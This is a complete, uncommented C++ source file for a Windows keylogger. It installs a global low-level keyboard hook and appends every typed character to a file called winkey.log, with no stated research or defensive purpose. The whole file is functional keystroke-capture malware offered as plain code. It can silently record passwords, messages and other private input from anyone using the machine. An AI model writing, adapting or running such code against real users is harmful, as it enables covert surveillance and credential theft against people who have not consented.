#pragma warning(disable:4530 4668 4577)

#include <windows.h>

#pragma comment(lib, "user32.lib")

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* kbd_struct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
	HANDLE hFile;
	DWORD dwPtr;

	switch (wParam) {
	case WM_KEYDOWN:
		UINT c = MapVirtualKey(kbd_struct->vkCode, MAPVK_VK_TO_CHAR);
		if (c == 0)
			break;
		hFile = CreateFile(
			TEXT("winkey.log"),
			GENERIC_WRITE,
			FILE_SHARE_READ,
			NULL,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (hFile != INVALID_HANDLE_VALUE) {
			SetFilePointer(hFile, 0, NULL, FILE_END);

			WriteFile(
				hFile,
				&c,
				1,
				&dwPtr,
				NULL);

			CloseHandle(hFile);
			hFile = INVALID_HANDLE_VALUE;
		}
		break;
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
{
	(void)hInstance;
	(void)hPrevInstance;
	(void)lpCmdLine;
	(void)nShowCmd;

	HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHook, 0, 0);

	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL) > 0) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(kbd);

	return 0;
}